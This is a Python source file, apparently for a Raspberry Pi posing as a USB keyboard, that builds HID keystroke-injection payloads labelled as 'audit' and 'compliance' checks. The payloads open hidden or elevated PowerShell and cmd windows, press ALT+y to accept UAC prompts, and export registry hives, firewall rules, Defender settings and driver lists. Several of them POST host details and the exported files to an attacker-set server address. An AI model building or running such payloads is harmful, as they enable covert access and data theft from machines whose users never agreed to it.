"""
Payload builder for generating HID injection scripts.
Supports dynamic templates with variable substitution.
"""

from datetime import datetime
import json


class PayloadBuilder:
    """Builds executable HID payloads from templates"""
    
    def __init__(self):
        self.payloads = {}
        self._register_default_payloads()
    
    def _register_default_payloads(self):
        """Register built-in payload templates"""
        
        # System info collector
        self.payloads['sysinfo'] = {
            'name': 'System Information Collector',
            'description': 'Collects Windows system information',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell -WindowStyle Hidden'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;user=$env:USERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption};'},
                {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}/check" -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Compliance check payload
        self.payloads['compliance'] = {
            'name': 'Compliance Check',
            'description': 'Checks security compliance and reports',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell -WindowStyle Hidden'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': '$fw=(Get-NetFirewallProfile -Profile Domain).Enabled;'},
                {'action': 'type', 'text': '$av=(Get-MpComputerStatus).AntivirusEnabled;'},
                {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;firewall_enabled=$fw;antivirus_updated=$av;timestamp="{{TIMESTAMP}}"};'},
                {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}/check" -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Simple test payload
        self.payloads['test'] = {
            'name': 'Test Payload',
            'description': 'Opens notepad with test message',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 400},
                {'action': 'type', 'text': 'notepad'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'Security Audit - {{TIMESTAMP}}'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'type', 'text': 'Host: {{HOST_ID}}'},
            ]
        }
        
        # Registry export - Policies (Works on Home)
        self.payloads['export_policies'] = {
            'name': 'Export Registry Policies',
            'description': 'Exports HKLM and HKCU Policies to C: (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'cmd'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        self.payloads['export_user_policies'] = {
            'name': 'Export User Policies',
            'description': 'Exports HKCU Policies to C: (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'cmd'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Registry export - Services (Works on Home)
        self.payloads['export_services'] = {
            'name': 'Export Services Registry',
            'description': 'Exports Services registry to C: (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'cmd'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Registry export - Control (Works on Home)
        self.payloads['export_control'] = {
            'name': 'Export Control Registry',
            'description': 'Exports Control registry to C: (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'cmd'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Firewall export (Works on Home)
        self.payloads['export_firewall'] = {
            'name': 'Export Firewall Config',
            'description': 'Exports firewall configuration to C: (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'cmd'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'netsh advfirewall export C:\\firewall.wfw'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Defender settings (Works on Home)
        self.payloads['export_defender'] = {
            'name': 'Export Defender Settings',
            'description': 'Exports Windows Defender preferences to JSON (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 > C:\\defender.json'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 2000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Driver enumeration (Works on Home)
        self.payloads['export_drivers'] = {
            'name': 'Export Driver List',
            'description': 'Exports installed drivers to C: (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'cmd'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'pnputil /enum-drivers > C:\\drivers.txt'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Device enumeration (Works on Home)
        self.payloads['export_devices'] = {
            'name': 'Export Device List',
            'description': 'Exports device list to C: (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'cmd'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'pnputil /enum-devices > C:\\devices.txt'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 3000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Combined audit (All Home-compatible commands)
        self.payloads['full_audit'] = {
            'name': 'Full System Audit',
            'description': 'Runs all Home-compatible exports (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\HKLM_Policies.reg /y;'},
                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\HKCU_Policies.reg /y;'},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\Services.reg /y;'},
                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\Control.reg /y;'},
                {'action': 'type', 'text': 'netsh advfirewall export C:\\firewall.wfw;'},
                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 > C:\\defender.json;'},
                {'action': 'type', 'text': 'pnputil /enum-drivers > C:\\drivers.txt;'},
                {'action': 'type', 'text': 'pnputil /enum-devices > C:\\devices.txt'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 8000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
        
        # Upload audit files to Pi
        self.payloads['upload_files'] = {
            'name': 'Upload Audit Files',
            'description': 'Uploads all audit files to Pi (Elevated)',
            'commands': [
                {'action': 'combo', 'keys': ['WIN', 'r']},
                {'action': 'delay', 'ms': 500},
                {'action': 'type', 'text': 'powershell'},
                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
                {'action': 'delay', 'ms': 1500},
                {'action': 'combo', 'keys': ['ALT', 'y']},
                {'action': 'delay', 'ms': 1000},
                {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall.wfw","defender.json","drivers.txt","devices.txt");'},
                {'action': 'type', 'text': 'foreach($f in $files){if(Test-Path "C:\\$f"){'},
                {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile "C:\\$f" -Headers @{"X-Filename"=$f}'},
                {'action': 'type', 'text': '}}'},
                {'action': 'key', 'name': 'ENTER'},
                {'action': 'delay', 'ms': 5000},
                {'action': 'type', 'text': 'exit'},
                {'action': 'key', 'name': 'ENTER'},
            ]
        }
    
    def get_payload(self, name, variables=None):
        """
        Get payload by name with variable substitution.
        
        Args:
            name: Payload name
            variables: Dict of variables to substitute
        
        Returns:
            List of commands with substituted variables
        """
        if name not in self.payloads:
            raise ValueError(f"Payload '{name}' not found")
        
        payload = self.payloads[name].copy()
        commands = payload['commands']
        
        # Default variables
        default_vars = {
            'TIMESTAMP': datetime.now().isoformat(),
            'HOST_ID': 'unknown',
            'SERVER_IP': '192.168.7.1:80',
        }
        
        # Merge with provided variables
        if variables:
            default_vars.update(variables)
        
        # Substitute variables in commands
        substituted = []
        for cmd in commands:
            new_cmd = cmd.copy()
            if 'text' in new_cmd:
                text = new_cmd['text']
                for var, value in default_vars.items():
                    text = text.replace(f'{{{{{var}}}}}', str(value))
                new_cmd['text'] = text
            substituted.append(new_cmd)
        
        return substituted
    
    def list_payloads(self):
        """List all available payloads"""
        return {
            name: {
                'name': payload['name'],
                'description': payload['description']
            }
            for name, payload in self.payloads.items()
        }
    
    def add_custom_payload(self, name, description, commands):
        """
        Add a custom payload.
        
        Args:
            name: Unique payload identifier
            description: Human-readable description
            commands: List of command dictionaries
        """
        self.payloads[name] = {
            'name': name,
            'description': description,
            'commands': commands
        }
